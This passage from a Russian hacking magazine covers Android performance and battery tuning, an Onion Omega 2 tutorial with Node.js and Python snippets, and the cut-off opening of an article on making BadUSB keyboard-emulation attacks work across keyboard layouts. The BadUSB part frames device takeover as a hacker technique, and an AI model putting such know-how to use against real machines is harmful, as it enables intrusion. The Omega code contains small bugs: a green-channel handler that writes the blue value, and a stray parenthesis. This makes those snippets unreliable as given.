      Opera Mini. Этот браузер знают, наверное, все. Но мы все равно о нем рас‐
       скажем, потому что есть малень кий, но важный нюанс. Дело в том, что сов‐
      ременная Opera Mini может работать в нескольких режимах. По умолчанию
      она использует WebView, то есть стандартный дви жок Chrome, предустанов‐
      ленный в любом Android, но если включить в настройках «экс тремальный»
      режим экономии, то браузер переключит ся в режим работы через сервер.
        Работает он сле дующим образом: веб‐стра ницы проходят через один
       из серверов Opera. Сервер конвертирует страницу в специальный компак‐
      тный формат, уменьшает раз решение изоб ражений, вырезает рекламу, сни‐
      жает битрейт видео, затем отправляет стра ницу на устрой ство. В результате
      ты получаешь значитель ную эко номию интернет‐тра фика и ресурсов процес‐
       сора, а это приводит  к умень шению потребления заряда аккумулятора
      и заметному ускорению заг рузки и отрисовки веб‐страниц. Платить за это
      приходится некорректной работой многих веб‐стра ниц.





                    Сайт xakep.ru и настройки экономии трафика


     Клавиату ра
      Здесь выбор простой: либо стандартная клавиатура, либо Simple Keyboard.
     В среднем она потребляет 18 Мбайт ОЗУ, а в NAND‐памяти занима‐
       ет 1,2 Мбайт. За компактность приходится пла тить отсутствием функций про‐
      верки правописания и предска зания вво да.





                           Simple Keyboard и AnySoftKeyboard


     YouTube
     В качестве замены YouTube выбира ем легковес ный (13 Мбайт в установ‐
      ленном виде) NewPipe. Для прос мотра роликов его возможностей более чем
      достаточно. Позволя ет скачивать видео, есть режим «картинка в картинке».
      Недостаток: нельзя подключить аккаунт Google, а это значит, что ты не уви‐
      дишь персонализированных рекомендаций и не смо жешь комментировать.





                          Смот рим видео в NewPipe


      Галерея
        • Simple Gallery — небольшая галерея, которая в установленном виде
         занимает всего лишь 9 Мбайт памяти. Присутс твует сортировка по пап‐
          кам. Для эстетов есть нас тройка цветово го оформле ния приложения.
         Работает очень быстро даже на слабом устройстве.
        • Focus Go. Минималистичная галерея от извес тного разработчика Фран‐
         циско Франко. Занимает 5 Мбайт в установленном виде.





                               Simple Gallery и Focus Go


     Карты
        • Maps.me — приложение использует карты OpenStreetMap, быс тро подгру‐
         жает их, работает плавно. По информационному напол нению Maps.me
        лишь немного уступают народным картам Яндекса (которые дос тупны
          только в фир менном приложении, беспощадно жрущем ресурсы устрой‐
          ства) и 2GIS (который нормально зна ет только города федерального зна‐
          чения).
        • OsmAnd — очень функциональные карты: множес тво тонко нас траиваемых
          стилей отображения карты, рельефа, раз личных слоев со  спутника,
         наличие фотографий мест через сервис Mapillary. Однако приложение,
         во‐первых, отличается неторопливостью и подергиваниями при изме‐
         нении масштаба и перетас кивании карты, а во‐вторых, тре бует загрузить
         карту мира, которая после уста новки занимает более 271 Мбайт.

     Имей в виду, если ты не уста новил на смартфон GApps, определение мес‐
      тоположения будет работать исключительно по GPS. Другими словами, ты
      не сможешь узнать мес тополо жение в помещениях. Чтобы это исправить,
       установи пакет UniﬁedNlp, а также два бэкенда к нему:
        • Apple UniﬁedNlp Backend;
        • MozillaNlpBackend.

      Первый нужен для определения местоположения по точкам доступа Wi‐Fi
       (используя базу данных Apple, что иронично), а второй — по сотовым вышкам.
      После установ ки необ ходимо вклю чить в нас тройках телефона определение
      местоположения «По всем источникам» и, возможно, перезагрузить смар‐
       тфон.





                            Maps Me и OsmAnd


     Му зыкальный пле ер
        • Music Player GO — очень простой плеер. Умеет сканировать память
         устройства и рассортировывать музыку по исполни телям.
        • Folder Player. Проигрыватель размером 5,4 Мбайт, который воспроизводит
         аудиофайлы, разложенные по пап кам.





                            Music Player GO и Folder Player


     Поч та
      K‐9 Mail в памяти устрой ства занимает 10,4 Мбайт. Работает быстро. По фун‐
       кциональности не только ничем не уступает более жирным почтовым кли‐
       ентам, но и значительно их превос ходит. Доступна возможность PGP‐шиф‐
       рования.





                     Читаем пись мо и нас тра иваем K‐9 Mail


                 INFO

                             Если  у  тебя  включена  двухфакторная  аутен‐
                             тификация Google, для подключения сторонней
                               почтовой программы к Gmail необходимо создать
                              пароль приложения. Как это сделать, подробно
                              написано в официальной инструк ции Google.



     Блок нот/заметки
        • Omni Notes. Пол нофункциональный менеджер заметок. Синхронизация
         и бэкап выполняются через выгружаемую на карту памяти базу данных.
        К заметке можно приложить нарисованный собс твенноручно рисунок,
        местоположение, аудиозапись, картинку. Работа ет очень быстро.
        • uNote. Самый простой менеджер заметок. В установленном виде занима‐
          ет 156 Кбайт памяти. Поз воляет создавать заметку и заголовок к ней. Нет
         поддержки списков, голосовых заметок, напоми наний и синхронизации.





                             Omni Notes и uNote




                                              Продолжение статьи →



}
    ТРЮКИ               ← НАЧАЛО СТАТЬИ

   ОБГОНЯЯ ФЛАГМАНЫ
           БОЛЬШОЙ ГАЙД ПО ОПТИМИЗАЦИИ ANDROID





     Кален дарь
       Simple Calendar. Название говорит само за себя. Работает быстро и плавно,
      занимает 10 Мбайт в постоянной памяти. По функци ональности не отличает‐
       ся от Google Календаря.
         Чтобы импортировать сохраненные события календаря, нажми на три точ‐
       ки вверху, а затем «Импорт событий из ICS‐файла».





                     Годовой календарь и кален дарь на месяц


     SIMPLE APPS
     Идем от сложного к простому. Чем короче путь, тем меньше тре буется ресур‐
       сов. Что нужно поль зователю? Чет кая и корректная работа программ. А уж
       красивыми анимациями и спецэффектами можно пре небречь. В своем
      стремлении прийти к этому разработчик Тибор Капута (Tibor Kaputa) создал
       пакет программ Simple Apps. Это простые, быстрые и эффективные приложе‐
       ния.



    ВЫЯВЛЯЕМ ЖАДНЫЕ ДО АККУМУЛЯТОРА ПРИЛОЖЕНИЯ
     В  этом  деле  стандартный  менеджер  потребления  аккумулятора  нам
      не поможет. Необходим Wakelock Detector. О том, как эффективно исполь‐
       зовать это приложение, мы уже писали в статье «Все, что нужно знать
      об энергосбе режении Android‐гаджетов», но все‐таки повторимся.
       В Wakelock Detector нас интересуют два экра на: «Будящие программы»
      и «Процессорный wakelock». Первый показывает, сколько раз приложе ние
      было причиной пробуждения устройства из режима сна, а второй — сколько
      времени программа в фоновом режиме использовала процессор (можно
       увидеть название процесса, если кликнуть по названию). Приложе ния, став‐
     шие причиной быстрого разряда аккумулятора, с большим отры вом возглав‐
      ляют верх списка. Статистика отоб ража ется с момента запус ка устройства.
        Для устранения причины повышенного энергопотребления стоит про‐
       гуляться по настрой кам приложения и поискать пункты «Отправка статис тики»
      и «Частота синхронизации», по воз можнос ти отклю чить их или пос тавить
      более высокие интервалы. Если это не помог ло, то самый действенный спо‐
      соб — удалить приложение.
         Когда  удаление  нежелательно,  придется  прибегнуть  к  усыплению
      с помощью специальных программ. Одна из лучших — Greenify. Она препятс‐
       твует выходу приложений из режима сна даже по определенным событиям
       (по времени, при подключении к сети, разблокировке устройства, установке/
       удалении программ). Пос ле уста новки и про хождения первоначальной нас‐
      тройки рекомендую зайти в настройки и поставить галочку напротив опции
      «Отслеживание и отсечение пробуждений → Рас ширенное отсечение про‐
      буждений».
         Пользоваться Greenify очень просто: после запус ка нажимаешь на + спра‐
       ва вверху и выбираешь пробуждающие устрой ство приложе ния, а когда все
      приложения будут выбраны — нажимаешь круглую кнопку внизу. Кстати,
       отдельные приложения можно нап рямую отправить из Wakelock Detector
       в Greenify для усыпления.





           Поиск будящих приложений в Wakelock Detector и их заморозка
                                      в Greenify


    ВКЛЮЧАЕМ АГРЕССИВНОЕ ЭНЕРГОСБЕРЕЖЕНИЕ
      Doze — это появив шаяся в Android 6.0 система энергосбережения. По умол‐
      чанию она включается примерно через час неактивнос ти смартфона, а ее
      работа состоит в том, чтобы не дать приложениям прос нуться и истратить
      заряд аккумулятора (более подробно про режим Doze мы писали в статье
       «Дозируй батарею правильно!»).
       В большинстве случаев тюнинговать Doze бессмысленно, но если ты
       хочешь, чтобы смартфон действитель но дол го работал от аккумулятора, то
      Doze можно заставить включаться не спустя час, а через несколько минут
      после отключения экрана. Сделать это можно с помощью программы Naptime
       (настройка Aggressive doze) или с помощью все того же Greenify (настройка
       опять же «Агрессивный Doze»).
       Однако есть и побочные эффекты: перес танут приходить уве домления
       от некоторых приложений. Что бы это исправить, приложения нужно добавить
       в белый список. Переходим в «Настройки → Приложе ния → Значок шес‐
      теренки → Специальный доступ → Экономия заряда батареи». Нажимаем
      на «Экономят заряд», переключаемся на «Все приложения» и отключаем эко‐
      номию заряда для нужных приложений.





                  Главный экран в Naptime и нас тройки Doze в Greenify


     НАСТРАИВАЕМ СИСТЕМУ УПРАВЛЕНИЯ ОПЕРАТИВНОЙ ПАМЯТЬЮ
       Android использует динамическую систему управления запущенными при‐
      ложениями. Это значит, что он не требует от поль зователя самостоятельно
       закрывать запущенные приложения, а делает это сам тогда, когда считает
      нужным.
        Подсистема, ответс твенная за закрытие приложе ний, называется Low
      Memory Killer. Ее можно нас троить на свой вкус либо внеся правки в файл /
      sys/module/lowmemorykiller/parameters/minfree, либо с помощью Ker‐
        nel Adiutor или специализиро ванных приложений вро де AutoKiller. Мы будем
      использовать Kernel Adiutor.
          Итак, устанавливаем и запус каем Kernel Adiutor, переходим на вкладку Low
      Memory Killer. Все приложения делят ся на шесть групп:
         1. Активные приложения (FOREGROUND_APP) — запущенные в данный
        момент приложения.
         2. Видимые приложения (VISIBLE_APP) — работа ющий в фоне процесс,
         отвечающий за вывод той или иной информа ции на экран (например, выд‐
         вижная панель, виджет).
         3. Вторичные  приложения  (SECONDARY_SERVER) —  фоновый  сервис
         (музыкальный проигрыватель, радио и так далее).
         4. Скрытые приложения (HIDDEN_APP) — выполняют какие‐то дей ствия
          в фоне, но при этом не выводят уведомление.
         5. Контент‐провайдеры (CONTENT_PROVIDER) — фоновый сервис, отве‐
        чающий за хранение и быс трое предос тавление какой‐либо информации,
          когда другие приложения просят ее предос тавить.
         6. Пустые приложения (EMPTY_APP) — фоновое приложение, которое
         ничего не делает.

       Чуть ниже есть раздел «Профили». Здесь Kernel Adiutor предлагает несколько
     шаблонов настрой ки агрессивности Low Memory Killer.





          Настройка Low Memory Killer в Kernel Adiutor и стандартные профили

     Цифры справа от названий групп показывают количес тво свободной опе‐
       ративной памяти, при превышении которо го приложения соответству ющих
       групп будут убиты.
         Согласно данным на скриншоте, система будет вести себя следующим
      образом:
        • если в ОЗУ свободно более 81 Мбайт, то никакие программы закрываться
         не будут;
        • как только в ОЗУ останется от 81 до 63 Мбайт, Low Memory Killer начнет
         убивать исклю чительно приложения категории EMPTY_APP;
        • свободной опе ративной памяти ста ло от 62 до 55 Мбайт — будут закрыты
         программы категорий EMPTY_APP (в большинс тве случаев они уже зак‐
         рыты) и CONTENT_PROVIDER;
        • если свободной оперативной памяти останется менее 27 Мбайт, будет
          закрыто активное приложение (FOREGROUND_APP), с которым взаимо‐
         действует поль зователь (очень маловероятная ситуация).

       Внутри конкретной группы в первую очередь будут остановлены процессы,
      занимающие больше всего памяти. Пос ле устранения каждого процесса Low
      Memory Killer сверяет дос тупный объем ОЗУ со своим файлом параметров
      и решает, нужно ли продолжать убивать.
       Многие пользователи привыкли открывать экран с пос ледними приложе‐
      ниями и смахивать их. В этом случае обычно прерываются EMPTY_APP
      и CONTENT_PROVIDER (которые ничего не потребляют и молча ждут либо
       когда Low Memory Killer их прибь ет, либо когда пользователь их запросит
      и они смогут почти мгновенно предос тавить контент). Процессы от HID‐
     DEN_APP до FOREGROUND_APP обычно уже закрыты. Что пользователь
       получает взамен — при повторном открытии «смахнутых» приложе ний смар‐
      тфон вновь должен загружать приложение с «дис ка» и как минимум заново
      отрисовывать все элементы интерфейса. В резуль тате повышается расход
       аккумулятора и возраста ет время откры тия приложений.
         Таким образом, нужно попытаться максимально уменьшить все значения,
       чтобы смартфон как мож но дольше держал в своей памяти откры тые при‐
      ложения. Главное — не переусердство вать. В иде але нужно добиться
      минимального размера, при котором система не должна завершать процес‐
      сы во время открытия наибо лее час то используемых приложений.
       Я рекомендую не замора чиваться с тес тами и просто поставить «Очень
       легкий» профиль в Kernel Adiutor.


    СПОРНЫЕ МОМЕНТЫ
     В Сети гуляет множество советов по опти миза ции и энергосбереже нию An‐
        droid. К сожалению, далеко не все из них полезны, а некоторые даже вредны.
        • Автоматическое (или руч ное) перек лючение на режим 2G. При‐
         водит к еще большему расходу заряда аккумулятора из‐за необходимос ти
          искать вышки и устанавливать с ними соединение.
        • Пункт в настройках Wi-Fi «Вык лючать всегда». Не име ет смысла.
        При подключенном соединении Wi‐Fi пот ребляет 30 мВт, невзирая на то,
         идет передача данных или нет, а передача данных через сети сотовой свя‐
         зи требует 50–500 мВт в зависимос ти от качества сигнала.
        • Отключение Bluetooth. Bluetooth не пот ребляет энергию, если не под‐
         клю чен к устрой ству. Так что отклю чать его нет смысла. Даже при активном
         соединении адаптер Bluetooth потребля ет около 2,5 мВт.
        • Сме на файловой системы на F2FS повышает ско рость чте ния
       и записи. Это миф. Последовательные чтение‐запись выпол няются
         на такой же скорости, как у ext4, а многократное воз растание случайной
         записи в ранних тестах — баг, который поз же был исправлен.

     Информация об энергопотреблении бес проводных модулей взя та из пуб‐
      ликации сотрудника Apple.



    ВЫЧИЩАЕМ МУСОР
     В Android множество предустановленных при ложений и сервисов. Некоторые
       из них система запускает автоматически после  загрузки или в  ответ
      на какое‐то событие. Нам это не всегда нужно, поэтому от такого софта луч‐
     ше избавиться.
         1. Устанавливаем и открываем Taskmanager.
         2. В настройках выключаем «Скрывать системные приложения» и включаем
         «Root access».
         3. Перезагружаем смартфон, чтобы выявить автоматически запускаемые
         приложения.
         4. Открываем Taskmanager и смотрим список приложений. Среди них навер‐
          няка есть те, которые тебе не нужны либо для которых ты нашел аналоги.





                     Запущенные процес сы в Taskmanager

     В моем случае (LineageOS 14.1) удаление следующих программ помогло
      сэкономить ресурсы устройства (уда лить приложения можно с помощью
      любого файлового менеджера с поддержкой root):
        • электронная почта /system/app/Email;
        • поддержка Exchange: /system/app/Exchange2;
        • службы  погоды  /system/app/YahooWeatherProvider ,  /system/
        privapp/WeatherManagerService и /system/privapp/Weather
        Provider (внимание: перес танет работать встроенный вид жет погоды);
        • оповещения населения о стихийных бедстви ях: /system/privapp/
        CellBroadcastReceiver ;
        • календарь /system/app/Calendar;
        • клавиатура /system/app/LatinIME (уда ляй, если установил сторон‐
         нюю);
        • система провер ки OTA‐обновлений /system/privapp/Updater.

      Это был мягкий вариант. А вот более экстремаль ный:
        • анимация загрузки: /system/media/bootanimation.zip. Пос ле уда‐
         ления будет воспроизводиться стандартная анимация Android или черный
          экран;
        • предустановленные  мелодии  звонка,  уведомлений  и  будильника:
        /system/media/audio в папках ringtones, notifications, alarms.
        При желании можно почистить папку ui, если системные зву ки тебе не нуж‐
          ны;
        • языки  примитивного  голосового  движка  Pico  TTS:  /system/tts/
        lang_pico. Голосовой движок Google это не затронет;
        • офлайн‐языки /system/usr/srec/config/, их можно будет скачать,
         если понадобятся.

      Другие системные приложения LineageOS, которые можно безболезненно
       удалить:
        • стоковый веб‐браузер: /system/app/Jelly;
        • калькулятор: /system/app/ExactCalculator;
        • эмулятор терминала: /system/app/Terminal;
        • музыкальный пле ер: /system/privapp/Eleven;
        • стоковая галерея /system/privapp/Gallery2;
        • менеджер первоначальной настройки: /system/privapp/LinageSe
        tupWizard;
        • надоедливое меню сим‐карты: /system/app/Stk;
        • диктофон и запись экра на: /system/privapp/Recorder;
        • виджет часов: /system/app/LockClock;
        • стоковый лаунчер: /system/privapp/Trebuchet;
        • тест GPS из инженерного меню: /system/app/YGPS;
        • программа получения‐отправки СМС: /system/app/messaging;
        • синтезатор речи Google: /system/app/PicoTts;
        • приложение часов (таймер, секундомер...): /system/app/LockClock;
        • пасхалка: /system/app/EasterEgg;
        • фоторамка: /system/app/PhotoTable;
        • живые обои: /system/app/LiveWallpapersPicker .


                      BUILD.PROP    ПРО МОДИФИКАЦИИ          И ИНСТРУКЦИИ
    С ФОРУМОВ
      Файл /system/build.prop присутству ет в любой прошивке Android и хранит
       внутри  себя  большое  количество  низкоуровневых  настроек,  а  также
      информацию об устройстве и самой про шивке. Файл build.prop принято
      использовать для оптимизации устройства: в Сети есть множество инструк‐
       ций, какие изменения в него следует внес ти.
        Но не торопись выполнять их. Пользователь форума xda‐developers про‐
      вел исследование и открыл неожиданную информа цию. Оказалось, что около
      двадцати настроек, рекомендуемых на форумах, вообще нигде не упомина‐
      ются в исходных текстах Android, а это зна чит, что они были просто выдуманы.
         Как ты думаешь, стоит ли доверять рекомендаци ям, многие из которых
      люди берут из головы?



     ЗАКЛЮЧЕНИЕ
     Даже относительно слабый смартфон с правильными при ложениями и нас‐
      тройками может впол не неплохо выглядеть на фоне более дорогих устройств.
      Чтобы это  доказать, сравним произво дительность нашего 4Good  Light
      B100 после тюнинга с флагманом 2016 года Samsung Galaxy S7 G930F,
       в котором используются стандартные при ложения вперемешку с программа‐
     ми Google. Все программы были запущены с холодного старта, то есть
      непосредственно после перезаг рузки аппа рата.





     Используемая память — это раз мер уста новленного приложе ния с его дан‐
      ными (в случае Maps.me учитыва ются также карты двух областей). Раз мер
      кеша не учитывается. Количество потребля емой оперативной памяти мы ука‐
       зывать не стали, потому что он силь но зависит от объ ема оперативной
      памяти устройства (а точнее, нас троек максимального размера хипа — heap
         size) и многих других параметров и внешних факторов.
        По автономности работы от акку мулятора 4Good впол не может сопер‐
       ничать с Samsung. Оба девайса живут примерно сут ки — сутки с половиной.
      Справедливости ради отмечу, что в Samsung в фоне работают десяток при‐
      ложений, установлены сервисы Google и включен Always on Display.



}
    ТРЮКИ

 OMEGA 2





        ПРОВЕРЯЕМ, НА ЧТО СПОСОБЕН
         КРОШЕЧНЫЙ И ДЕШЕВЫЙ
           КОМПЬЮТЕР С LINUX





    В  жизни  каждого  мейкера  наступа ет
     момент, когда обычных микроконтроллеров
     уже не хватает, а тратить деньги на рас‐
     пберри  жалко. Именно  тут  и  выходит
     на сцену девайс под скромным названием          Виктор Паперно                                                                                                      vpap1997@inbox.ru
     Onion Omega 2. По размерам и цене близ‐
     кий к микроконтроллерам, он обладает воз‐
     можностями, сравнимыми с возможнос‐
     тями Raspberry Pi.


    И ВСЕ-ТАКИ ЧЕМ ОТЛИЧАЕТСЯ МИКРОКОНТРОЛЛЕР ОТ МИНИ-
     КОМПЬЮТЕРА?





                              Omega 2

      На мой взгляд, основное отличие микроконтрол лера от мини‐компьютера
       (одноплатника) — операционная система. На микроконтрол лере есть прог‐
      рамма, прошив ка. Да, в некоторых контроллерных прошивках, например Mi‐
       cropython, реализована частичная функци ональ ность операционной системы,
      работа с файлами, пользовательский интерфейс и прочее, но это не делает
       их (платы с такой прошивкой) компьютерами.
        А поскольку на Omega 2 установлена облегченная версия Linux — LEDE
        (Linux Embedded Development Environment), базирующаяся на OpenWRT, то,
      несмотря на свой форм‐фактор, Omega 2 — од ноплатный компьютер.
       Кстати, компания‐произво дитель позициони рует его как «самый маленький
       в мире компьютер с установленной Linux».


     Посмотрим, что он уме ет
      Сейчас в продаже находится две версии Onion Omega: 2 и 2+. В данной
       статье рассматривается версия Onion Omega 2. Плата для обзора была
      любезно предоставлена магазином iarduino.ru.





                     Сравнитель ное описание Omega 2 и 2+

       Итак, у нашего компьютера:
        • 580 МГц CPU
        • 64 Мбайт оператив ной памяти
        • 16 Мбайт флеш‐памяти
        • USB 2.0
        • Wi‐Fi
        • 15 GPIO
        • 2 PWM
        • 2 UART
        • 1 I2C
        • 1 SPI
        • 1 I2S

       Как можно заметить на картинке, на самой пла те есть только пины, нет даже
       входа для питания. Для того чтобы начать работать с платой, придется рас‐
      кошелиться на док‐станцию. Их существует целых пять штук, каждая удобна
       в своем случае. Я буду использовать Expansion dock. На ней расположены
      GPIO, USB‐порт, RGB‐светодиод, кноп ка Reset, выключатель и порт microUSB
      для питания устрой ства.





                            Виды док‐станций


                 INFO

                            Кроме док‐стан ций, для Omega существуют раз‐
                             личные стан дартные модули: BLE‐модуль, модуль
                              для подключения Ethernet, GPS‐модуль, модуль
                            OLED‐дисплея.   Есть  и  различные  шилды:
                              для работы с RFID‐метками, для управления реле
                             и сервоприводами.



     Начинаем работу
      Очень много примеров работы с этой платой уже рас смотрено на рус ско‐
      язычном форуме, поэто му я толь ко про бегусь по основным пунктам настрой‐
        ки, а затем мы приступим уже к более‐менее реальным проектам.
         Вставляем плату в шилд, подключаем питание — и поехали!
         Если питание благопо лучно пода ется, то в списке доступных Wi‐Fi‐сетей
     мы вскоре увидим сеть с наз ванием Omega-XXXX, где вместо XXXX будет
       кусочек MAC‐адреса (кстати, пароль стандартный — 12345678). Подклю‐
      чаемся к этой сети и с помощью любого браузера заходим по адре‐
       су 192.168.3.1, а дальше, следуя любезным инструкциям разработчиков пла‐
        ты, выполняем первичную нас тройку: подключаем плату к своему Wi‐Fi, чтобы
      не переключаться между сетями, регистри руемся в облаке и устанавливаем
       консоль. Логин и пароль по умолчанию — root и onioneer соответственно.





                    Панель управления (консоль) Omega 2

      После завершения настройки мы сможем попасть в панель управления
      Omega.  Почему‐то она  называется  консолью, но  от привычного нам
      интерфейса командной строки она довольно далека :). На самом деле боль‐
     ше всего эта панель управления напоминает, по крайней мере мне, Launch‐
      pad на macOS. Давай попробуем разобрать ся, зачем нужна каждая из утилит.
        • GPIO Tool позволяет каждому пину пос тавить в соответствие режим
         работы Input/Output и уста новить значение по умол чанию — 0 или 1.
        • OLED Control — если ты купил еще и модуль с экраном, то эта программка
         поможет вывести на него текст или картинку.
        • Settings — настрой ки, их можно посмотреть и отредактировать, в частнос‐
          ти обновить прошивку или сбросить плату до заводских настроек.
        • Relay Control — утилита для управления реле, опять же на допол нительном
         модуле.
        • PWM Control — отличает ся от предыдущей утилиты лишь тем, что контро‐
         лирует сервоприводы.

      Эти программы поставляются вместе с прошивкой, оставшиеся же требуют
       отдельной установки.
        • Terminal — привычный всем пользователям Linux интерфейс командной
         строки.
        • Editor — минималистичный текстовый редактор и фай ловый менеджер.
        • Webcam — утилита для стриминга с помощью обычной USB‐веб‐камеры.

     Перед тем как начать работу, нужно решить, на мой взгляд, основную проб‐
      лему — нехватку памяти. 16 Мбайт малова то. Поэтому подключаем флешку
      и переносим на нее сис темный раз дел.
         1. Открываем терминал и обновляем список доступных пакетов командой
         opkg update
         2. Затем устанавливаем нуж ные нам пакеты:
         opkg install e2fsprogs
         3. Отмонтируем нашу флешку. Если выдаст ошиб ку — не переживай:
         umount USB‐A1
         4. Форматируем флешку в ext4:
         mkfs.ext4 /dev/sda1
         5. Ждем завершения форматиро вания.
         6. Создаем точ ку монтирования и монтируем в него нашу флешку:
         mkdir /mnt/sda1
         mount /dev/<device name> /mnt/sda1
         7. Переносим каталог /overlay на флешку:

         mount /dev/sda1 /mnt/ ; tar ‐C /overlay ‐cvf ‐ . | tar ‐C /
         mnt/ ‐xf ‐ ; umount /mnt/
         8. И устанавливаем авто матическое монтирова ние при включении:
         opkg install block‐mount
         block detect > /etc/config/fstab

      Открываем файлик /etc/config/fstab и заменяем в нем
        • option  target  '/mnt/<device  name>' на option  target  '/
        overlay';
        • option enabled '0' на option enabled '1'.

      Сохраняем и перезагружа емся. Ф‐ф‐фух! Теперь памяти у нас достаточно.
     И вот теперь мы действитель но начинаем!


       Hello RGB & Node.js
     Одно из больших преимуществ данной платы — возможность программи‐
       ровать ее на разных языках. Например, Node.js. Уста новим его, а также нес‐
       колько дополнительных пакетов:


       opkg install nodejs
       opkg install npm
       opkg install blynk‐library
       npm install ‐‐save rgb‐hex

     В  качестве демонстрации раз берем,  как работает управление Omega
      2 с помощью Blynk. Напомню, что Blynk — это облачный сервис, имеющий
       iOS‐ и Android‐приложения для управления микроконтрол лерами (Arduino,
      ESP8266, Raspberry и подобные) через интернет. Управлять мы будем встро‐
      енным в мой шилд RGB‐светодиодом. Для работы с ним есть встроенная ути‐
       лита expled. В качестве параметра подается зна чение цвета в формате Hex.
        Сначала создадим про ект в Blynk. Выбира ем из доступных плат Onion
      Omega.
        Затем добав ляем виджеты zeRGBa (виджет выбора цвета) и Styled Button.
      Настраиваем виджет zeRGBa: выбираем виртуальные пины для подключения
        (я выбрал 15 для красного цвета, 16 для зеленого и 17 для синего) и диапа‐
      зон для цвета — от 0 до 255. Styled Button мы просто подключаем к виртуаль‐
      ному пину 0.
       И теперь самое  главное — зай дя  в нас тройки проекта,  скопируй
      или отправь на email свой AUTH TOKEN.





                                     Blynk‐проект

      Теперь вернемся к Omega. Откроем Editor, создадим папку Scripts, а в ней
      файлик main.js c вот таким содержимым:


       const exec = require('child_process').exec;
       const rgbHex = require('rgb‐hex');
       var BlynkLib = require('/usr/bin/blynk‐library');
       var blynk = new BlynkLib.Blynk("<YOUR AUTH TOKEN>");
       var v15 = new blynk.VirtualPin(15);
       var v16 = new blynk.VirtualPin(16);
       var v17 = new blynk.VirtualPin(17);
       var v0 = new blynk.VirtualPin(0);
       var R = 0;
       var G = 0;
       var B = 0;
       v15.on('write', function(param) {
         R = parseInt(param);
       });
       v16.on('write', function(param) {
         B = parseInt(param);
       });
       v17.on('write', function(param) {
         B = parseInt(param);
       });
       v0.on('write', function(param) {
         exec("expled 0x"+rgbHex(R,G,B));
       });

      Разберемся, что происходит.
        Вначале подключаются необ ходимые модули. В exec заносится функция
      вызова утилиты из консоли, в rgbHex — функция конвертации цвета из RGB
       в Hex, а в blynk — подключение к нашему Blynk‐проекту.
        Затем объявляются виртуальные пины: 15, 16 и 17 для получе ния RGB,
      0 для обработки кнопки. В три переменные, R, G и B, будут заноситься зна‐
      чения соответствующих сос тавляющих цвета.
        А затем описывается, что происходит при отправке данных на каждый вир‐
       туальный пин. Функции для трех цветовых сос тавля ющих идентичны, отли‐
       чается лишь переменная, в которую записывается число. Когда пользователь
      нажимает на кнопку — вызывается функция expled, а в качестве параметра
      поступает шестнадцатеричное зна чение цвета.


    Вы водим сооб щения на экран
      Хотя уже достаточно давно появилась воз можность прослушивать входящие
      сообщения, например с помощью Siri или Алисы, прочитать сообщение все
      же для многих быстрее. Хорошо, если ты докупил шилд с экраном, а если нет?
      Будем выкручиваться! На помощь нам при ходит один из самых распростра‐
      ненных модулей для Arduino — I2C LCD Display.
        Поскольку с Node.js мы уже работали, этот про ект напишем на Python.
      Для установки достаточно ввести уже привычное opkg  install  python.
      Очень часто можно встретить предложение уста новить так называемый
      python‐light — легкую сборку. Да, можно уста новить и третью версию
       питона, но часть библиотек для работы непос редственно с Omega 2+
      не устанавливается на нее. Так что будем работать с версией 2.7.
        Не забываем установить привычный любому разработчику на Python
      менеджер пакетов pip: opkg install python‐pip, а также все, что необ‐
      ходимо для работы с I2C: opkg install git git‐http pyOnionI2C.
          Итак, пускай на экран выводится все, что приходит в наш телеграм‐бот
       (благо, несмотря на обещанную блокировку, он продол жает работать).
         Устанавливаем PyTelegramBotApi с помощью pip, скачиваем с офи‐
      циального сайта Omega 2 библиотеку git clone https://bitbucket.org/
      fires/fireonion_i2c_lcd. Подключаем пины на мониторе к соответству‐
     ющим пинам на плате.


       import lcdDriver
       import telebot
       bot = telebot.TeleBot("TOKEN")
       lcdAddress = 0x3f
       lcd = lcdDriver.Lcd(lcdAddress)
       lcd.backlightOn()
       @bot.message_handler(func=lambda message: True)
       def echo_all(message):
           lcd.lcdDisplayStringList([message.chat.first_name,message.text]))
       if __name__ == '__main__':
           bot.polling(none_stop=True)

      Все очень просто: подклю чаем необходимые биб лиотеки, когда приходит
      сообщение — выводим его на экран вмес те с именем отправите ля.


     ЗАКЛЮЧЕНИЕ, РАЗМЫШЛЕНИЯ И ВЫВОДЫ
     Omega 2 действительно неплохое устройство, но, как и у любого Linux‐based
       устройства, у него есть недос татки.
         Во‐первых, хорошо работают лишь устройства, подключаемые через
       модули, запустить внешний OLED‐экран через I2C у меня так и не получилось.
      Во‐вторых, несмотря на дос таточно обширную документацию аж на трех язы‐
        ках, все какое‐то еще сырое. Периодичес ки при ходится устанавливать другие
      библиотеки, рыться на форумах. Кроме того, изна чально цена платы колеба‐
       лась около 5 дол ларов, а сейчас, чтобы начать работать с платой Omega 2,
      придется выложить минимум 20,75 доллара, что с учетом курса уже дорого‐
       вато.
        Для чего же хороша эта плата? Для небольших домашних проектов, когда
      не хочется паять и проще купить модуль, — определенно да. Набор языков
       программирования, привычный интерфейс командной строки. В качестве
      небольшого сервера в том случае, если мощностей Omega 2 хватает, — нет
      смысла покупать более дорогую Raspberry Pi.


           WWW

                        •Официальный сайт производите ля
                             •Русскоязычный форум





}
    ТРЮКИ

    РУСИФИЦИРУЕМ
  УТОЧКУ





                                                                 vipluxa
                                                                il.ryzhov@yandex.ru




            КАК ЗАСТАВИТЬ BADUSB
            РАБОТАТЬ С РАЗНЫМИ
         РАСКЛАДКАМИ КЛАВИАТУРЫ




    BadUSB — один из самых интересных инструментов в арсе‐
     нале хакера. Этот класс атак позволяет при помощи девай‐
     сов вроде Rubber Ducky захватить контроль над многими
     устройствами, у которых есть порт USB. Можно эмулировать
    любую периферию, но чаще всего подделывают клавиатуру.
    В этой статье я покажу, как решить одну из главных связан‐
     ных с этим проблем — зависимость от текущей раскладки.


                 INFO

                            Существуют две основные категории устройств
                               типа BadUSB: флешка с контроллером Phison
                              2251‐03 (для него была разработана специальная
                             прошивка, эмулирующая клавиатуру) и устрой‐
                                 ства на мик роконтроллере ATmega (например,
                              Rubber Ducky).


     BadUSB придумали относитель но недавно, в 2014 году. Поэтому еще есть
      шанс найти новые трюки и решить по дороге раз ные нетриви альные задачи.
      Для тех, кто живет в странах, где, помимо латинского алфавита, используется
       какой‐то другой, одна из таких задач — это переключение ввода на нужную
      раскладку клавиатуры. Если в операци онной системе выставлена рус ская
      раскладка, а твой скрипт скармливает ей нажатия на клавиши в английской,
       то из этого, конеч но же, ничего не выйдет.





                  Пример работы BadUSB на рус ской раскладке

       Как обойти эту проб лему? Нап ример, можно попытаться учесть изменение
      раскладки в скриптах, но для это го при дется узна вать, какие именно язы ки
